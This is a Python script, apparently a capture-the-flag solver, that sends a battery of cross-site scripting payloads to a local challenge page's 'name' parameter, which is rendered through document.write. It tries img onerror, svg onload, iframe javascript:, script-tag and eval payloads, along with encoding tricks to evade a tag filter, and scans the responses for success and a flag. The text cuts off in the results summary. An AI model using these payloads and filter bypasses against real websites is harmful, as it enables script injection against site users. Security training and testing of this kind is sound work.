import requests
import urllib.parse
import re

target_url = "http://127.0.0.1:32830/page"

def url_encode(s):
    return urllib.parse.quote(s, safe='')

def test_html_injection():
    """Test injecting HTML that will be rendered by document.write"""
    
    print("="*80)
    print("HTML INJECTION STRATEGY (document.write context)")
    print("="*80)
    print("Context: document.write('Hello ' + name)")
    print("Strategy: Inject HTML tags that execute XSS when rendered")
    print()
    
    # Since document.write renders HTML, we can inject:
    # <img src=x onerror="alert(String.fromCharCode(88,83,83))">
    
    test_cases = []
    
    # Test 1: Direct img tag with String.fromCharCode
    test1 = '<img src=x onerror="alert(String.fromCharCode(88,83,83))">'
    test_cases.append(("img + fromCharCode", test1))
    
    # Test 2: SVG tag (more reliable)
    test2 = '<svg onload="alert(String.fromCharCode(88,83,83))"></svg>'
    test_cases.append(("svg + fromCharCode", test2))
    
    # Test 3: Body onload
    test3 = '<body onload="alert(String.fromCharCode(88,83,83))">'
    test_cases.append(("body onload", test3))
    
    # Test 4: Image with error
    test4 = '<img src="x" onerror="alert(String.fromCharCode(88,83,83))">'
    test_cases.append(("img onerror", test4))
    
    # Test 5: Using unicode escapes in onerror
    test5 = '<img src=x onerror="alert(\"\\u0058\\u0053\\u0053\")">'
    test_cases.append(("img + unicode escapes", test5))
    
    # Test 6: Using atob in onerror
    test6 = '<img src=x onerror="alert(atob(\"WFNT\"))">'
    test_cases.append(("img + atob", test6))
    
    # Test 7: Nested evaluation
    test7 = '<img src=x onerror="eval(\"alert(String.fromCharCode(88,83,83))\")">'
    test_cases.append(("img + nested eval", test7))
    
    # Test 8: Using iframe
    test8 = '<iframe src="javascript:alert(String.fromCharCode(88,83,83))"></iframe>'
    test_cases.append(("iframe javascript:", test8))
    
    # Test 9: Using script tag (might be blocked)
    test9 = '<script>alert(String.fromCharCode(88,83,83))</script>'
    test_cases.append(("script tag", test9))
    
    # Test 10: Event handler without quotes
    test10 = '<img src=x onerror=alert(String.fromCharCode(88,83,83))>'
    test_cases.append(("img no quotes", test10))
    
    success_cases = []
    
    for i, (desc, payload) in enumerate(test_cases, 1):
        print(f"\n[TEST {i:02d}] {desc}")
        print(f"Raw HTML: {payload}")
        
        enc = url_encode(payload)
        print(f"URL: {target_url}?name={enc}")
        
        try:
            url = f"{target_url}?name={enc}"
            r = requests.get(url, timeout=10)
            text = r.text
            length = len(text)
            
            print(f"Length: {length} (baseline: 817)")
            
            # Check for XSS execution
            if "XSS" in text:
                print(f"[!] SUCCESS! XSS executed!")
                
                # Find context
                idx = text.find("XSS")
                snippet = text[max(0, idx-100):idx+50]
                print(f"Context: ...{snippet}...")
                
                # Check for flag
                if "FLAG{" in text:
                    fidx = text.find("FLAG{")
                    flag = text[fidx:text.find("}", fidx)+1]
                    print(f"[🏴‍☠️] FLAG: {flag}")
                
                success_cases.append((desc, payload, enc, text))
            else:
                # Check for HTML tags reflected
                if '<img' in text or '<svg' in text or '<script' in text:
                    print(f"[+] HTML tag reflected (partial success)")
                    
                    # Show reflection
                    match = re.search(r'document\.write\(.*?\+ name\);', text)
                    if match:
                        doc_write = match.group(0)
                        print(f"document.write call: {doc_write}")
                else:
                    print(f"[-] No XSS or HTML tags in response")
                
                # Check for filter message
                if "Sorry you can't use" in text:
                    blocked_match = re.search(r"Sorry you can't use: '(.+?)'", text)
                    if blocked_match:
                        blocked = blocked_match.group(1)
                        print(f"[FILTER] Blocked: {blocked}")
        
        except Exception as e:
            print(f"[-] Error: {e}")
        
        print("-"*70)
    
    return success_cases

def test_encoding_bypasses():
    """Test encoded versions to bypass HTML tag filtering"""
    
    print(f"\n{'='*80}")
    print("ENCODED HTML TAG BYPASS ATTEMPTS")
    print(f"{'='*80}")
    
    # Try various encodings for < and >
    encodings = []
    
    # HTML entities
    enc1 = '<img src=x onerror="alert(String.fromCharCode(88,83,83))">'
    enc1 = enc1.replace('<', '&lt;').replace('>', '&gt;')
    encodings.append(("HTML entity &lt;&gt;", enc1))
    
    # Unicode escapes
    enc2 = '<img src=x onerror="alert(String.fromCharCode(88,83,83))">'
    enc2 = enc2.replace('<', '\\u003c').replace('>', '\\u003e')
    encodings.append(("Unicode \\u003c\\u003e", enc2))
    
    # Hex entities
    enc3 = '<img src=x onerror="alert(String.fromCharCode(88,83,83))">'
    enc3 = enc3.replace('<', '\\x3c').replace('>', '\\x3e')
    encodings.append(("Hex \\x3c\\x3e", enc3))
    
    # URL encoded inside attribute
    enc4 = '<img src=x onerror="alert(String.fromCharCode(88,83,83))">'
    encodings.append(("Raw (no encoding)", enc4))
    
    success_cases = []
    
    for i, (desc, payload) in enumerate(encodings, 1):
        print(f"\n[ENC {i:02d}] {desc}")
        print(f"HTML: {payload}")
        
        enc = url_encode(payload)
        print(f"URL: {target_url}?name={enc}")
        
        try:
            url = f"{target_url}?name={enc}"
            r = requests.get(url, timeout=10)
            text = r.text
            
            if "XSS" in text:
                print(f"[!] SUCCESS with {desc}!")
                
                # Check context
                idx = text.find("XSS")
                snippet = text[max(0, idx-100):idx+50]
                print(f"Snippet: {snippet}")
                
                success_cases.append((desc, payload, enc, text))
            else:
                print(f"[-] No XSS")
        
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return success_cases

# Run the tests
html_success = test_html_injection()
enc_success = test_encoding_bypasses()

# Summary
print(f"\n{'='*80}")
print("FINAL RESULTS")
print(f"{'='*80}\n")

total_success = len(html_success) + len(enc_success)

if total_success > 0:
